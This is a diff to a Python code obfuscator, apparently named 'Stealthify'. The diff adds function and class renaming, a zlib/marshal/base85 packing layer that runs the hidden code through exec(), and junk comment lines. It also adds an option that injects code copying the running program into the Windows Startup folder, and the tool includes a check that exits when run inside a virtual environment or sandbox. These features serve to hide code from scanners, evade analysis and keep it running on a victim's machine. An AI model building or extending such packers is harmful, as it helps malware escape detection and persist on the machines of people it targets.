@@ -1,4 +1,4 @@
-import ast, random, base64, os, marshal, lzma, sys
+import ast, random, base64, os, marshal, zlib, sys
 from colorama import Fore as f
 
 os.system("cls")
@@ -14,11 +14,22 @@ class Obfuscator(ast.NodeTransformer):
             self.mapping[name] = new_name
         return self.mapping[name]
 
+    def visit_ClassDef(self, node):
+        obfuscated_name = self.obfuscate_name(node.name)
+        self.mapping[node.name] = obfuscated_name
+        node.name = obfuscated_name
+        return self.generic_visit(node)
+
     def visit_FunctionDef(self, node):
+        obfuscated_name = self.obfuscate_name(node.name)
+        self.mapping[node.name] = obfuscated_name
+        node.name = obfuscated_name
+
         for arg in node.args.args:
-            obfuscated_name = self.obfuscate_name(arg.arg)
-            self.function_parameters[arg.arg] = obfuscated_name
-            arg.arg = obfuscated_name
+            obfuscated_arg = self.obfuscate_name(arg.arg)
+            self.function_parameters[arg.arg] = obfuscated_arg
+            arg.arg = obfuscated_arg
+
         return self.generic_visit(node)
 
     def visit_Name(self, node):
@@ -61,23 +72,22 @@ def Add_Dead_code(code):
     for line in obfuscated_lines:
         new_lines.append(line)
         dead_code_length = random.randint(2, 5)
-        dead_code = '__STEALTHIFY_OBFUSCATED__' * dead_code_length
+        dead_code = '__STEALTHIFY_V2__' * dead_code_length
         new_lines.append(f"#{dead_code}")
     return '\n'.join(new_lines)
 
 def Stealthcrypt(content):
-    CMARK = '__STEALTHIFY__' * 15
+    CMARK = '__STEALTHIFY__V2__' * 15
     COFFSET = 10
     marshaled_data = marshal.dumps(content.encode())
-    compressed_data = lzma.compress(marshaled_data)
+    compressed_data = zlib.compress(marshaled_data)
     encoded_data = base64.b85encode(compressed_data).decode()
     b64_encoded_data = base64.b64encode(encoded_data.encode()).decode()
     code = f'{CMARK} = ""\n'
     for i in range(0, len(b64_encoded_data), COFFSET):
         chunk = b64_encoded_data[i:i+COFFSET]
-        hex_chunk = ''.join([f'\\x{ord(c):02x}' for c in chunk])
-        code += f'{CMARK} += "{hex_chunk}"\n'
-    code += f"import lzma,marshal,base64;exec(marshal.loads(lzma.decompress(base64.b85decode(base64.b64decode({CMARK}.encode()).decode()))))"
+        code += f'{CMARK} += "{chunk}"\n'
+    code += f"exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b85decode(__import__('base64').b64decode({CMARK}.encode()).decode()))))"
     return code
 
 try:
@@ -94,6 +104,7 @@ try:
     iterations = int(input(f.RED + "Number of Obfuscation Layers: "))
     antivm = input(f.RED + "Enable Anti VM? [yes/no]: ")  
     add_junk = input("Add Dead Code? [yes/no]: ")
+    startup = input("Use Startup? [yes/no]: ")
     use_Stealthcrypt = input(f.RED + "Use Encoding And Encryption? [yes/no]: ")
 
     try:
@@ -114,6 +125,14 @@ def in_virtualenv():
     return get_base_prefix_compat() != sys.prefix
 if in_virtualenv() == True:
     sys.exit()
+"""
+
+    if startup.lower() == 'yes':
+        obfuscated_code += """
+import sys,os,shutil
+currentfile = sys.argv[0]
+folder_path = os.path.join(os.environ['APPDATA'],'Microsoft','Windows','Start Menu','Programs','Startup')
+shutil.copy(currentfile,folder_path)
 """
     
     if add_junk.lower() == 'yes':
